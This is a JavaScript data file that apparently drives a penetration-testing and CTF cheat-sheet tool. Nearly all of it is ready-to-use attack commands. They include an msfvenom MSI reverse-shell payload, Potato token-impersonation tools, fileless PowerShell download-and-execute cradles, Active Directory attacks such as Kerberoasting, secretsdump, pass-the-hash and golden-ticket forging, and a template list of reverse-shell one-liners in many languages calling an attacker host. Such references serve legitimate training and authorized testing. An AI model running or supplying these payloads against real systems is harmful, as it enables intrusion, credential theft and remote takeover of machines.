          { cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f msi -o evil.msi", desc: "Build an MSI payload for the AlwaysInstallElevated path.", tags: ["winpriv", "msi", "msfvenom", "alwaysinstallelevated"] },
          { cmd: "msiexec /quiet /qn /i C:\\temp\\evil.msi", desc: "Install the MSI silently — it runs as SYSTEM when the policy is set.", tags: ["winpriv", "msiexec", "system", "install"] }
        ]
      },
      {
        id: "winpotato",
        title: "Token Impersonation (Potato family)",
        note: "When you hold SeImpersonatePrivilege (common on service accounts / IIS / MSSQL), impersonate a SYSTEM token.",
        items: [
          { cmd: "whoami /priv | findstr /i SeImpersonate", desc: "Precondition check — the Potato family needs this privilege.", tags: ["winpriv", "seimpersonate", "token"] },
          { cmd: "PrintSpoofer.exe -i -c cmd   /   PrintSpoofer.exe -c \"C:\\temp\\rev.exe\"", desc: "PrintSpoofer — reliable on Windows 10 / Server 2016-2019.", tags: ["winpriv", "printspoofer", "potato", "system"] },
          { cmd: "GodPotato -cmd \"cmd /c whoami\"   /   GodPotato -cmd \"C:\\temp\\rev.exe\"", desc: "GodPotato — works across a very wide Windows / .NET range.", tags: ["winpriv", "godpotato", "potato"] },
          { cmd: "JuicyPotatoNG.exe -t * -p C:\\temp\\rev.exe", desc: "JuicyPotatoNG — the modern Juicy variant for newer builds.", tags: ["winpriv", "juicypotato", "potato"] }
        ]
      },
      {
        id: "winps",
        title: "PowerShell Enum One-Liners",
        items: [
          { cmd: "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/winPEAS.ps1')", desc: "Download-and-run winPEAS in memory, no file touches disk.", tags: ["winpriv", "powershell", "iex", "download"] },
          { cmd: "Get-ChildItem -Path C:\\ -Include *.kdbx,*.config,unattend.xml,*.rdg -Recurse -EA SilentlyContinue", desc: "Hunt KeePass DBs, configs, unattend.xml and RDP manager files.", tags: ["winpriv", "powershell", "creds", "hunt"] },
          { cmd: "Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | select DefaultUserName,DefaultPassword", desc: "Autologon credentials stored in the registry in cleartext.", tags: ["winpriv", "autologon", "winlogon", "creds"] },
          { cmd: "Get-LocalUser; Get-LocalGroupMember Administrators; (Get-WmiObject Win32_OperatingSystem).Caption", desc: "Local users, admin group members and OS edition.", tags: ["winpriv", "powershell", "users", "enum"] }
        ]
      }
    ]
  },

  /* ========================================================
     ACTIVE DIRECTORY
     ======================================================== */
  {
    id: "ad",
    title: "Active Directory",
    emoji: "🏰",
    desc: "Collect the graph, roast tickets, dump secrets, then move laterally with hashes and tickets. netexec (ex-crackmapexec) and impacket do most of the work.",
    groups: [
      {
        id: "bloodhound",
        title: "BloodHound Collection & Analysis",
        note: "Collect from any domain context, import the JSON/zip, mark owned nodes, then run the pre-built 'Shortest Path to Domain Admins' query.",
        items: [
          { cmd: "bloodhound-python -u USER -p 'PASS' -d DOMAIN -ns DC_IP -c all --zip", desc: "Remote collection from Linux — no agent needed on the DC.", tags: ["ad", "bloodhound", "collect", "python"] },
          { cmd: "SharpHound.exe -c All --zipfilename loot.zip", desc: "On-host collection from a Windows foothold.", tags: ["ad", "bloodhound", "sharphound", "windows"] },
          { cmd: "netexec ldap DC_IP -u USER -p 'PASS' --bloodhound --collection All --dns-server DC_IP", desc: "Collect straight through netexec's LDAP module.", tags: ["ad", "bloodhound", "netexec", "ldap"] },
          { cmd: "sudo neo4j console   # then open BloodHound and import the zip", desc: "Start the graph DB, load data, mark owned, trace paths to high-value targets.", tags: ["ad", "bloodhound", "neo4j", "analysis"] }
        ]
      },
      {
        id: "roast",
        title: "Kerberoasting / AS-REP Roasting",
        note: "Kerberoast needs any domain creds and targets accounts with an SPN. AS-REP roast needs only a username list and targets accounts with pre-auth disabled.",
        items: [
          { cmd: "impacket-GetUserSPNs DOMAIN/USER:'PASS' -dc-ip DC_IP -request -outputfile tgs.txt", desc: "Request TGS tickets for all SPN accounts (Kerberoast).", tags: ["ad", "kerberoast", "impacket", "spn"] },
          { cmd: "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP -format hashcat", desc: "AS-REP roast users with pre-auth disabled — no password required.", tags: ["ad", "asrep", "impacket", "preauth"] },
          { cmd: "Rubeus.exe kerberoast /outfile:tgs.txt /nowrap", desc: "Kerberoast from a Windows foothold with Rubeus.", tags: ["ad", "kerberoast", "rubeus"] },
          { cmd: "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt", desc: "AS-REP roast with Rubeus.", tags: ["ad", "asrep", "rubeus"] },
          { cmd: "hashcat -m 13100 tgs.txt rockyou.txt   # AS-REP:  hashcat -m 18200 asrep.txt rockyou.txt", desc: "Crack the TGS (13100) or AS-REP (18200) hashes offline.", tags: ["ad", "hashcat", "crack", "13100", "18200"] }
        ]
      },
      {
        id: "impacket",
        title: "impacket Toolkit",
        items: [
          { cmd: "impacket-secretsdump DOMAIN/USER:'PASS'@DC_IP", desc: "Dump SAM/LSA/NTDS secrets — the DCSync of choice with the right rights.", tags: ["ad", "impacket", "secretsdump", "ntds", "dcsync"] },
          { cmd: "impacket-psexec DOMAIN/USER:'PASS'@RHOST", desc: "SYSTEM shell via service creation (noisy but reliable).", tags: ["ad", "impacket", "psexec", "shell"] },
          { cmd: "impacket-wmiexec DOMAIN/USER:'PASS'@RHOST", desc: "Semi-interactive shell over WMI — quieter than psexec.", tags: ["ad", "impacket", "wmiexec", "shell"] },
          { cmd: "impacket-smbclient DOMAIN/USER:'PASS'@RHOST", desc: "Browse SMB shares interactively.", tags: ["ad", "impacket", "smbclient", "smb"] },
          { cmd: "impacket-mssqlclient DOMAIN/USER:'PASS'@RHOST -windows-auth", desc: "MSSQL client with integrated auth — enable xp_cmdshell for RCE.", tags: ["ad", "impacket", "mssql", "xp_cmdshell"] },
          { cmd: "netexec smb RHOST -u USER -p 'PASS' --shares   # add --sam / --lsa / -x 'cmd'", desc: "netexec SMB for spraying, share listing, and command execution.", tags: ["ad", "netexec", "smb", "spray"] }
        ]
      },
      {
        id: "ptpth",
        title: "Pass-the-Hash / Pass-the-Ticket",
        note: "Once you own an NT hash or a Kerberos ticket, you rarely need the plaintext password again.",
        items: [
          { cmd: "impacket-psexec -hashes :NTHASH USER@RHOST", desc: "Pass-the-hash to a SYSTEM shell (LM left blank).", tags: ["ad", "pth", "pass-the-hash", "impacket"] },
          { cmd: "netexec smb RHOST -u USER -H NTHASH --local-auth", desc: "Spray a hash across hosts to find where it is admin.", tags: ["ad", "pth", "netexec", "spray"] },
          { cmd: "evil-winrm -i RHOST -u USER -H NTHASH", desc: "Interactive WinRM shell via pass-the-hash.", tags: ["ad", "pth", "evil-winrm", "winrm"] },
          { cmd: "export KRB5CCNAME=ticket.ccache; impacket-psexec -k -no-pass DOMAIN/USER@TARGET.DOMAIN", desc: "Pass-the-ticket — use a Kerberos ccache instead of a password.", tags: ["ad", "ptt", "kerberos", "ccache"] },
          { cmd: "Rubeus.exe ptt /ticket:BASE64TICKET   # then run tooling in that session", desc: "Inject a ticket into the current logon session on Windows.", tags: ["ad", "ptt", "rubeus", "ticket"] },
          { cmd: "impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN Administrator", desc: "Forge a Golden Ticket once you have the krbtgt hash.", tags: ["ad", "golden-ticket", "krbtgt", "impacket"] }
        ]
      }
    ]
  },

  /* ========================================================
     REVERSE SHELLS & FILE TRANSFER
     ======================================================== */
  {
    id: "shells",
    title: "Reverse Shells & File Transfer",
    emoji: "🐚",
    desc: "Generate a reverse shell for any language, stabilise it into a proper TTY, then move files on and off the box.",
    groups: [
      {
        id: "revgen",
        title: "Reverse Shell Generator",
        type: "revshell",
        note: "Set LHOST / LPORT once — every payload below updates live. Start the matching listener first."
      },
      {
        id: "stab",
        title: "Shell Stabilisation",
        note: "Turn a dumb shell into a full interactive TTY so Ctrl-C, arrows, tab-completion and su/ssh work.",
        items: [
          { cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", desc: "Step 1 — upgrade to a PTY-backed bash (try python/python3/script).", tags: ["shell", "pty", "stabilise", "tty"] },
          { cmd: "script -qc /bin/bash /dev/null", desc: "Alternative PTY upgrade when python is absent.", tags: ["shell", "script", "pty"] },
          { cmd: "export TERM=xterm; export SHELL=/bin/bash", desc: "Step 2 — set TERM so clear/less/vim render correctly.", tags: ["shell", "term", "env"] },
          { cmd: "# Ctrl-Z  then:  stty raw -echo; fg  then:  (press enter twice)", desc: "Step 3 — background, hand the local terminal raw to the remote shell, foreground.", tags: ["shell", "stty", "raw", "echo"] },
          { cmd: "stty -a   # note local rows/cols, then on target: stty rows R cols C", desc: "Step 4 — match the terminal size so full-screen apps don't wrap.", tags: ["shell", "stty", "rows", "cols"] }
        ]
      },
      {
        id: "transfer",
        title: "File Transfer",
        note: "Serve a file from the attacker, pull it from the target. Pick a method the box actually has.",
        items: [
          { cmd: "python3 -m http.server 80            # attacker: serve current dir", desc: "Start a quick HTTP server to host payloads/tools.", tags: ["transfer", "http", "python", "serve"] },
          { cmd: "wget http://LHOST/file -O /tmp/file   /   curl http://LHOST/file -o /tmp/file", desc: "Linux target pulls over HTTP.", tags: ["transfer", "wget", "curl", "linux"] },
          { cmd: "certutil -urlcache -split -f http://LHOST/file.exe C:\\Windows\\Temp\\file.exe", desc: "Windows download via the built-in certutil LOLBIN.", tags: ["transfer", "certutil", "windows", "lolbas"] },
          { cmd: "powershell -c \"IWR http://LHOST/file.exe -OutFile C:\\Windows\\Temp\\file.exe\"", desc: "PowerShell Invoke-WebRequest download cradle.", tags: ["transfer", "powershell", "iwr", "windows"] },
          { cmd: "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://LHOST/s.ps1')\"", desc: "Fileless PowerShell download-and-execute in memory.", tags: ["transfer", "powershell", "fileless", "iex"] },
          { cmd: "nc -lvnp 443 > out.file      # attacker    |    nc LHOST 443 < file   # target", desc: "Raw netcat file transfer when HTTP is blocked.", tags: ["transfer", "nc", "netcat"] },
          { cmd: "scp file user@RHOST:/tmp/   /   scp user@RHOST:/path/file .", desc: "SCP transfer when you have SSH credentials.", tags: ["transfer", "scp", "ssh"] },
          { cmd: "base64 -w0 file   # then on target:  echo BASE64 | base64 -d > file", desc: "Base64 chunking — paste a binary through a shell with no network transfer.", tags: ["transfer", "base64", "paste", "chunk"] },
          { cmd: "impacket-smbserver share . -smb2support   # attacker    |    copy \\\\LHOST\\share\\f.exe .  # target", desc: "SMB share for fast Windows transfers (supports copy both ways).", tags: ["transfer", "smb", "impacket", "windows"] }
        ]
      }
    ]
  },

  /* ========================================================
     BINARY EXPLOITATION
     ======================================================== */
  {
    id: "pwn",
    title: "Binary Exploitation",
    emoji: "🧨",
    desc: "Check protections first — they decide the whole approach. Then fuzz, find the offset, clear bad chars, locate a return target and build the exploit.",
    groups: [
      {
        id: "checksec",
        title: "checksec",
        items: [
          { cmd: "checksec --file=./binary", desc: "Dump the binary's mitigations before anything else.", tags: ["pwn", "checksec", "mitigations"] },
          { cmd: "file ./binary; strings ./binary | less; nm ./binary 2>/dev/null | grep -i win", desc: "Architecture, embedded strings, and giveaway functions like win()/system().", tags: ["pwn", "file", "strings", "nm"] }
        ]
      },
      {
        id: "checksec-ref",
        title: "Protections — what each implies",
        type: "ref",
        items: [
          { term: "NX / DEP", desc: "Stack is non-executable. No shellcode on the stack — pivot to ROP / ret2libc." },
          { term: "Canary / Stack Guard", desc: "Random value before saved RIP. You must leak it (format string / partial overwrite) before smashing the return address." },
          { term: "PIE", desc: "Binary base is randomised. You need a leak of a program address to compute gadget offsets." },
          { term: "ASLR", desc: "Libc/stack/heap addresses randomised at runtime. Needs a leak; the binary itself is unaffected unless PIE is also on." },
          { term: "RELRO (Full)", desc: "GOT is read-only — no GOT overwrite. Partial RELRO still allows GOT writes." }
        ]
      },
      {
        id: "bofmethod",
        title: "Buffer Overflow Methodology",
        type: "checklist",
        items: [
          "Fuzz: send growing cyclic input until the program crashes (SIGSEGV).",
          "Find offset: cyclic 200 → crash → cyclic_find $rsp (pwntools) or pattern_offset.",
          "Control EIP/RIP: overwrite with BBBB / 0x4242… and confirm in the debugger.",
          "Bad chars: send \\x00-\\xff, diff memory, exclude bytes that get mangled.",
          "Find return address: JMP ESP gadget (32-bit) or a ROP chain / win() address.",
          "Space check: confirm enough room after the overwrite for your payload.",
          "Build exploit: padding + saved-return overwrite + (ROP / shellcode / win args).",
          "Test locally with ASLR off, then adapt the leak strategy for the remote."
        ]
      },
      {
        id: "pwntools",
        title: "pwntools Boilerplate",
        items: [
          { cmd: "from pwn import *\ncontext.binary = elf = ELF('./binary')\n# p = process('./binary')\np = remote('RHOST', LPORT)\noffset = 72\npayload = flat({offset: elf.symbols['win']})\np.sendline(payload)\np.interactive()", desc: "Minimal exploit skeleton — local process or remote, with a flat() payload.", tags: ["pwn", "pwntools", "boilerplate", "exploit"] },
          { cmd: "cyclic 200            # generate pattern\ncyclic -l 0x6161616c   # find the offset from the crash value", desc: "Offset discovery with pwntools' cyclic pattern.", tags: ["pwn", "pwntools", "cyclic", "offset"] },
          { cmd: "ROPgadget --binary ./binary | grep 'pop rdi'", desc: "Find ROP gadgets (pop rdi; ret is the staple for 64-bit calls).", tags: ["pwn", "rop", "ropgadget", "gadget"] },
          { cmd: "one_gadget /lib/x86_64-linux-gnu/libc.so.6", desc: "Find a single-jump execve(/bin/sh) gadget in libc for ret2libc.", tags: ["pwn", "one_gadget", "libc", "ret2libc"] },
          { cmd: "gdb -q ./binary   # with pwndbg/gef:  pattern create 200 / pattern offset $rsp", desc: "Debug with pwndbg/gef for fast offset and gadget work.", tags: ["pwn", "gdb", "pwndbg", "gef"] }
        ]
      }
    ]
  },

  /* ========================================================
     CRYPTO / STEGANOGRAPHY / FORENSICS
     ======================================================== */
  {
    id: "crypto",
    title: "Crypto / Steg / Forensics",
    emoji: "🔐",
    desc: "Identify before you attack. Hash type, cipher family or file structure decides the tool. rockyou.txt lives at /usr/share/wordlists/rockyou.txt.",
    groups: [
      {
        id: "stegtools",
        title: "Steg & Forensics Tools",
        items: [
          { cmd: "binwalk -e file   # --dd='.*' to force-extract everything", desc: "Detect and carve embedded files/filesystems from a blob.", tags: ["forensics", "binwalk", "carve", "extract"] },
          { cmd: "exiftool file", desc: "Read all metadata — authors, GPS, comments, hidden strings.", tags: ["forensics", "exiftool", "metadata"] },
          { cmd: "steghide extract -sf image.jpg   # prompts for passphrase ('' often works)", desc: "Extract data hidden by steghide in JPEG/BMP/WAV/AU.", tags: ["steg", "steghide", "extract", "jpg"] },
          { cmd: "stegseek image.jpg /usr/share/wordlists/rockyou.txt", desc: "Brute-force the steghide passphrase — far faster than stegcracker.", tags: ["steg", "stegseek", "brute", "steghide"] },
          { cmd: "zsteg -a file.png", desc: "LSB / bit-plane steganography detection for PNG and BMP.", tags: ["steg", "zsteg", "lsb", "png"] },
          { cmd: "foremost -i file -o out/", desc: "File carving by signature — recover deleted/embedded files.", tags: ["forensics", "foremost", "carve"] },
          { cmd: "strings -n 8 file | less   # add -e l / -e b for wide chars", desc: "Pull printable strings; widen for UTF-16 blobs.", tags: ["forensics", "strings"] },
          { cmd: "xxd file | head -40   # eyeball magic bytes vs the claimed extension", desc: "Hex dump to verify/spot the real file type.", tags: ["forensics", "xxd", "hex", "magic"] }
        ]
      },
      {
        id: "cracking",
        title: "John & Hashcat",
        note: "hashid/hash-identifier names the hash. unshadow merges passwd+shadow. Pick the right mode number from the table below.",
        items: [
          { cmd: "hashid -m 'HASH'   /   hash-identifier", desc: "Identify the hash type and get candidate hashcat modes.", tags: ["crack", "hashid", "identify"] },
          { cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt", desc: "John auto-detects most formats; add --format=NAME to force one.", tags: ["crack", "john", "wordlist"] },
          { cmd: "unshadow /etc/passwd /etc/shadow > hashes.txt; john hashes.txt", desc: "Combine passwd+shadow, then crack the unix user hashes.", tags: ["crack", "john", "unshadow", "shadow"] },
          { cmd: "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", desc: "Hashcat straight dictionary attack (mode 0 = MD5).", tags: ["crack", "hashcat", "dictionary"] },
          { cmd: "hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule", desc: "NTLM crack with the best64 rule set applied.", tags: ["crack", "hashcat", "ntlm", "rules"] },
          { cmd: "hashcat -m 0 hash.txt -a 3 '?u?l?l?l?l?d?d'", desc: "Mask/brute-force attack for a known password pattern.", tags: ["crack", "hashcat", "mask", "brute"] }
        ]
      },
      {
        id: "hashmodes",
        title: "Common Hashcat Modes",
        type: "table",
        columns: ["Mode", "Hash", "Notes"],
        rows: [
          ["0", "MD5", "32 hex chars"],
          ["100", "SHA1", "40 hex chars"],
          ["1400", "SHA-256", "64 hex chars"],
          ["1700", "SHA-512", "128 hex chars"],
          ["1000", "NTLM", "Windows; 32 hex chars"],
          ["3200", "bcrypt", "starts $2a$ / $2b$"],
          ["500", "md5crypt", "starts $1$ (Linux)"],
          ["1800", "sha512crypt", "starts $6$ (Linux)"],
          ["5600", "NetNTLMv2", "Responder captures"],
          ["13100", "Kerberos TGS-REP", "Kerberoasting"],
          ["18200", "Kerberos AS-REP", "AS-REP roasting"],
          ["22000", "WPA-PBKDF2", "Wi-Fi handshakes"],
          ["13400", "KeePass", ".kdbx databases"],
          ["900", "MD4", "legacy"]
        ]
      },
      {
        id: "cipherid",
        title: "Cipher Identification Tips",
        type: "ref",
        items: [
          { term: "= padding, A-Za-z0-9+/", desc: "Base64. Decode with `base64 -d`. Base32 uses A-Z2-7 and more = padding." },
          { term: "Only 0-9 a-f, even length", desc: "Hex. `xxd -r -p` or CyberChef 'From Hex'. Often wraps another layer." },
          { term: "Letters only, word shapes kept", desc: "Substitution/Caesar/ROT. Try ROT13, then frequency analysis (e,t,a,o common)." },
          { term: "Repeating-key feel, letters only", desc: "Vigenère. Find key length (Kasiski/IC), then solve per-column as Caesar." },
          { term: "Two big numbers n,e (+ maybe c)", desc: "RSA. Factor small n (factordb/yafu), weak e=3, or common-modulus. Use RsaCtfTool." },
          { term: "Same length in/out, XOR hints", desc: "XOR cipher. Single-byte: brute 0-255. Known-plaintext reveals the key." },
          { term: "Dots and dashes / A1Z26 / Braille", desc: "Encoding, not encryption. Morse, letter-number, Braille — map with CyberChef." }
        ]
      }
    ]
  },

  /* ========================================================
     STUCK? START HERE
     ======================================================== */
  {
    id: "stuck",
    title: "Stuck? Start Here",
    emoji: "🧭",
    desc: "When the obvious path is exhausted, work a branch top to bottom. Tick items as you rule them out.",
    groups: [
      {
        id: "stuck-web",
        title: "Stuck on a web app",
        type: "checklist",
        items: [
          "View source + all linked JS for comments, endpoints, API keys, hidden params.",
          "Check /robots.txt, /sitemap.xml, /.git/, /.well-known/ for leaked paths.",
          "Fuzz for backup/old files: .bak .old .zip .swp ~ and index.php.bak.",
          "Try default / weak creds on every login (admin:admin, admin:password).",
          "Enumerate HTTP methods (OPTIONS) — PUT/DELETE/TRACE may be enabled.",
          "Inspect every cookie and response header; decode JWTs, test weak secrets.",
          "Fuzz hidden parameters with ffuf (burp-parameter-names) on each endpoint.",
          "Add discovered vhosts to /etc/hosts and re-run content discovery per host.",
          "Check for different behaviour when authenticated vs not on the same route."
        ]
      },
      {
        id: "stuck-priv",
        title: "Stuck on privesc",
        type: "checklist",
        items: [
          "Re-run linPEAS/winPEAS and actually read every red/yellow line.",
          "sudo -l again — and check GTFOBins for each allowed binary.",
          "Unusual SUID/SGID binaries and file capabilities (getcap -r /).",
          "Writable cron jobs, systemd units, service binaries and their PATHs.",
          "Run pspy — catch root cron/processes and passwords passed on the command line.",
          "Hunt creds: config files, .bash_history, .env, DB connection strings, backups.",
          "Reused passwords — try the web/db password for su and SSH on every user.",
          "Kernel version vs known LPEs (PwnKit, DirtyPipe) only as a last resort.",
          "Internal services on 127.0.0.1 (ss -tlnp) — port-forward and attack them."
        ]
      },
      {
        id: "stuck-box",
        title: "Stuck on a box entirely",
        type: "checklist",
        items: [
          "Scan ALL TCP ports (-p-), not just the top 1000 — the way in is often high.",
          "UDP scan the top ports (SNMP 161, TFTP 69, DNS 53, IKE 500).",
          "Re-enumerate subdomains and vhosts; brute the Host header.",
          "Re-check service versions against searchsploit for a direct exploit.",
          "Enumerate SMB/NFS/FTP for anonymous access and readable shares.",
          "Look harder at the obvious service — read its docs and default paths.",
          "Spray any creds you already have across every service and protocol.",
          "Step back: what is this box themed around? The theme usually hints the path."
        ]
      }
    ]
  },

  /* ========================================================
     USEFUL LINKS
     ======================================================== */
  {
    id: "links",
    title: "Useful Links",
    emoji: "🔗",
    desc: "The references worth keeping one click away. All open in a new tab.",
    groups: [
      {
        id: "links-privesc",
        title: "Privilege Escalation",
        type: "links",
        items: [
          { label: "GTFOBins", url: "https://gtfobins.github.io/", note: "Unix binaries abused for privesc / sudo escape" },
          { label: "LOLBAS", url: "https://lolbas-project.github.io/", note: "Living-off-the-land Windows binaries" },
          { label: "HackTricks — Linux Privesc", url: "https://book.hacktricks.xyz/linux-hardening/privilege-escalation", note: "The definitive checklist" },
          { label: "HackTricks — Windows Privesc", url: "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation", note: "Windows LPE checklist" }
        ]
      },
      {
        id: "links-ref",
        title: "References & Payloads",
        type: "links",
        items: [
          { label: "HackTricks", url: "https://book.hacktricks.xyz/", note: "Methodology for nearly everything" },
          { label: "PayloadsAllTheThings", url: "https://github.com/swisskyrepo/PayloadsAllTheThings", note: "Payloads and bypasses per vuln class" },
          { label: "pentestmonkey Cheat Sheets", url: "https://pentestmonkey.net/category/cheat-sheet", note: "Reverse shells, SQLi, one-liners" },
          { label: "OWASP Testing Guide", url: "https://owasp.org/www-project-web-security-testing-guide/", note: "Structured web testing reference" }
        ]
      },
      {
        id: "links-tools",
        title: "Online Tools",
        type: "links",
        items: [
          { label: "revshells.com", url: "https://www.revshells.com/", note: "Reverse shell generator + listener" },
          { label: "CyberChef", url: "https://gchq.github.io/CyberChef/", note: "Encoding, crypto, data analysis swiss-army knife" },
          { label: "Exploit-DB", url: "https://www.exploit-db.com/", note: "Public exploits (searchsploit mirror)" },
          { label: "crackstation.net", url: "https://crackstation.net/", note: "Fast lookup for unsalted hashes" },
          { label: "dcode.fr", url: "https://www.dcode.fr/en", note: "Cipher identification and solvers" }
        ]
      }
    ]
  }
];

/* ============================================================
   Reverse shell payload templates
   {{LHOST}} / {{LPORT}} are substituted by the generator.
   ============================================================ */
const REVSHELLS = [
  { name: "Bash -i",        cmd: "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1" },
  { name: "Bash (196)",     cmd: "0<&196;exec 196<>/dev/tcp/{{LHOST}}/{{LPORT}}; sh <&196 >&196 2>&196" },
  { name: "Bash (base64)",  cmd: "echo 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1' | base64" },
  { name: "nc (mkfifo)",    cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f" },
  { name: "nc -e",          cmd: "nc -e /bin/sh {{LHOST}} {{LPORT}}" },
  { name: "ncat",           cmd: "ncat {{LHOST}} {{LPORT}} -e /bin/bash" },
  { name: "Python3",        cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'" },
  { name: "PHP",            cmd: "php -r '$sock=fsockopen(\"{{LHOST}}\",{{LPORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
  { name: "Perl",           cmd: "perl -e 'use Socket;$i=\"{{LHOST}}\";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
  { name: "Ruby",           cmd: "ruby -rsocket -e'f=TCPSocket.open(\"{{LHOST}}\",{{LPORT}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },
  { name: "socat",          cmd: "socat TCP:{{LHOST}}:{{LPORT}} EXEC:'bash -li',pty,stderr,setsid,sigint,sane" },
  { name: "PowerShell",     cmd: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()\"" },
  { name: "Netcat Windows", cmd: "nc.exe {{LHOST}} {{LPORT}} -e cmd.exe" }
];

/* Matching listeners for the shell you choose. */
const LISTENERS = [
  { name: "netcat",               cmd: "nc -lvnp {{LPORT}}" },
  { name: "ncat (TLS)",           cmd: "ncat --ssl -lvnp {{LPORT}}" },
  { name: "rlwrap + nc (arrows)", cmd: "rlwrap nc -lvnp {{LPORT}}" },
  { name: "socat (full TTY)",     cmd: "socat file:`tty`,raw,echo=0 TCP-L:{{LPORT}}" }
];
